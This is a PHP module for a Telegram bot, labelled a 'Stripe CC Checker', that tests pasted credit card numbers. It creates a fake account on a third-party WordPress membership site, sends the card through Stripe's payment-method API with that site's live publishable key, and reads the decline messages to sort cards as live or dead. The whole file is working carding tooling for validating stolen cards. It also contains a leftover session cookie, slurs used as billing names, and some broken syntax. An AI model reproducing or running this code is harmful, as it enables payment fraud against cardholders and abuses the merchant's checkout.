<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/gay ") === 0 || strpos($message, ".gay ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
            if(file_exists(getcwd().('/cookie.txt'))){
                @unlink('cookie.txt');
              } 
            #------[Email Generator]------#
            
            function emailGenerate($length = 10)
            {
                $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                $charactersLength = strlen($characters);
                $randomString     = '';
                for ($i = 0; $i < $length; $i++) {
                    $randomString .= $characters[rand(0, $charactersLength - 1)];
                }
                return $randomString . '@gmail.com';
            }
            $email = emailGenerate();
            
            #------[CC Type Randomizer]------#
            
             $cardNames = array(
                "3" => "American Express",
                "4" => "Visa",
                "5" => "MasterCard",
                "6" => "Discover"
             );
             $card_type = $cardNames[substr($cc, 0, 1)];
            
            #------[Rand]------#
            
            $DET     = file_get_contents("https://namegenerator.in/assets/refresh.php?location=united-states");
            $data = json_decode($DET, true);
            $fname = explode(" ", $data['name'])[0];
            $lname = explode(" ", $data['name'])[1];
            
            $first   = ucfirst(str_shuffle('ＡＲＣ Σ ＵＳ'));
            $last    = ucfirst(str_shuffle('Noob'));
            $street  = trim(strip_tags(getStr($DET,'"street":"','"')));
            $city    = trim(strip_tags(getStr($DET,'"city":"','"')));
            $state   = trim(strip_tags(getStr($DET,'"state":"','"')));
            $Zip     = trim(strip_tags(getStr($DET,'"postcode":',',"')));
            $seed    = trim(strip_tags(getStr($DET,'"seed":"','"')));
            $ph      = array("682","346","246");
            $ph1     = array_rand($ph);
            $phh     = $ph[$ph1];
            $phone   = "$phh".rand(0000000,9999999)."";
            $numero1 = substr($phone, 1,3);
            $numero2 = substr($phone, 6,3);
            $numero3 = substr($phone, 6,4);
            
            /*
            Product Page => https://www.browserstack.com/pricing
            */
            
            #------[GET]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://theibsguide.com/');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            $headers = array();
            $headers[] = 'authority: theibsguide.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: none';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $get = curl_exec($ch);
            
            
            
            #------[CURL-1]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://theibsguide.com/register/happy-gut-guide');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            $headers = array();
            $headers[] = 'authority: theibsguide.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /register/happy-gut-guide';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'referer: https://theibsguide.com/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $curl1 = curl_exec($ch);
            
            
            
            #------[CURL-2]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://theibsguide.com/register/happy-gut-guide');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
            $headers = array();
            $headers[] = 'authority: theibsguide.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /register/happy-gut-guide';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'cache-control: max-age=0';
            $headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryYqtdeZoEv8CUfZBl';
            $headers[] = 'origin: https://theibsguide.com';
            $headers[] = 'referer: https://theibsguide.com/register/happy-gut-guide';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_process_signup_form"
            
            Y
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_product_id"
            
            22
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="user_first_name"
            
            Madarchod
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="user_last_name"
            
            Randi
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr-geo-country"
            
            
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="user_email"
            
            '.$email.'
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_user_password"
            
            Moon12#
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_user_password_confirm"
            
            Moon12#
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_coupon_code"
            
            
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_payment_method"
            
            pk2x1e-3fx
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_agree_to_tos"
            
            on
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK
            Content-Disposition: form-data; name="mepr_no_val"
            
            
            ------WebKitFormBoundaryg52Ru9VaEF1i4TuK--');
            $curl2 = curl_exec($ch);
            //curl_close($ch);
            
            #------[CURL-3]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://theibsguide.com/register/happy-gut-guide?action=checkout&txn=20q');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            $headers = array();
            $headers[] = 'authority: theibsguide.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /register/happy-gut-guide?action=checkout&txn=20q';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'cache-control: max-age=0';
            $headers[] = 'referer: https://theibsguide.com/register/happy-gut-guide';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=checkout&txn=20q');
            $curl3 = curl_exec($ch);
            
            #------[CURL-4]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
            $headers = array();
            $headers[] = 'authority: api.stripe.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /v1/payment_methods';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: application/json';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'content-type: application/x-www-form-urlencoded';
            $headers[] = 'origin: https://js.stripe.com';
            $headers[] = 'referer: https://js.stripe.com/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: empty';
            $headers[] = 'sec-fetch-mode: cors';
            $headers[] = 'sec-fetch-site: same-site';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=10080&billing_details[name]=Madarchod+Randi&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8bb1ed99-c599-402e-8062-662f2629c63279ace5&muid=aec96180-8cd4-4613-8e3a-49198d6d6e95f73a45&sid=7a39ec89-f779-457d-ab0c-c8f08add248cedb006&pasted_fields=number&payment_user_agent=stripe.js%2Fb003e5966%3B+stripe-js-v3%2Fb003e5966&time_on_page=22831&key=pk_live_51B8s7BBTWoZbCeAdpQBKwGDYAelb2OMqCwXCn6d8TF0Meo13RwBtRdZQbtynmThIRkiUtFh1sESQTLhB1JENjqIg00Y0mmjhRg');
            $curl4 = curl_exec($ch);
            
            // Stripe iD
            $id = trim(strip_tags(getStr($curl4,'"id": "','"')));
            
            #------[CURL-5]------#
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://theibsguide.com/wp-admin/admin-ajax.php');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
            $headers = array();
            $headers[] = 'authority: theibsguide.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /wp-admin/admin-ajax.php';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'cache-control: no-cache';
            $headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryncQIn76PvC9A4Jxj';
            #$headers[] = 'cookie: wordpress_sec_06d9b7b99047dbc33bf42c633a3d9d82=MCRAANDI%40gmail.com%7C1638625143%7CSN7km3nlNEQttgs7f0p091rnf26MmfVBNhYlIj4wrr8%7C974aa69902d7736a0b85a2738ca9d85f2b3849c2dd19772ed22cb8b6cb04ec97; _ga=GA1.2.410341711.1638452299; _gid=GA1.2.909717911.1638452299; wordpress_logged_in_06d9b7b99047dbc33bf42c633a3d9d82=MCRAANDI%40gmail.com%7C1638625143%7CSN7km3nlNEQttgs7f0p091rnf26MmfVBNhYlIj4wrr8%7C7742a403b31b557a838aa3b759886166dd9fdc9fff971131234685d843246075; PHPSESSID=697c22589a64bd2eb8f8ffa95ac57f47; ms-uid=697c22589a64bd2eb8f8ffa95ac57f47; __stripe_mid=747d3399-441e-4fff-a588-fb4315868166d8ca4b; __stripe_sid=6201d26e-7008-4189-b479-18c74a52d1dea755e9';
            $headers[] = 'origin: https://theibsguide.com';
            $headers[] = 'referer: https://theibsguide.com/register/happy-gut-guide?action=checkout&txn=20q';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: empty';
            $headers[] = 'sec-fetch-mode: cors';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            $headers[] = 'x-requested-with: XMLHttpRequest';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="mepr_transaction_id"
            
            5612
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="address_required"
            
            0
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="card-name"
            
            Madarchod Randi
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="payment_method_id"
            
            '.$id.'
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="action"
            
            mepr_stripe_confirm_payment
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj
            Content-Disposition: form-data; name="mepr_current_url"
            
            https://theibsguide.com/register/happy-gut-guide?action=checkout&txn=20q#mepr_jump
            ------WebKitFormBoundaryncQIn76PvC9A4Jxj--');
            $curl5 = curl_exec($ch);
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);
            // Response
            $respo = trim(strip_tags(getStr($curl5,'"error":"','"')));
            echo "<b><i>Response: $curl5</b></i><br>";
            //echo "<b><i>ID: $id</b></i><br>";
######################END OF CHECKER PART################################################################################
            
            
            if(substr_count($curl5, "The zip code you supplied failed validation."))){
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV Matched [AVS Failure] ✅
Response -» Approved ( The zip code you supplied failed validation. ))){)
Gateway -» Stripe Auth 
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax/a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            
            elseif(strpos($curl5, 'Your card has insufficient funds.')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Credit Floor] ✅
    Response -» Approved (Insufficient Funds)
    Gateway -» Stripe Auth 
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
              elseif(strpos($curl5, "Your card's security code is incorrect.")) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CCN Matched [CVV2 Failure] ✅
    Response -» Approved (Your card's security code is incorrect.)
    Gateway -» Stripe Auth 
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» Card was Declined
  Gateway -» Stripe Auth 1
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>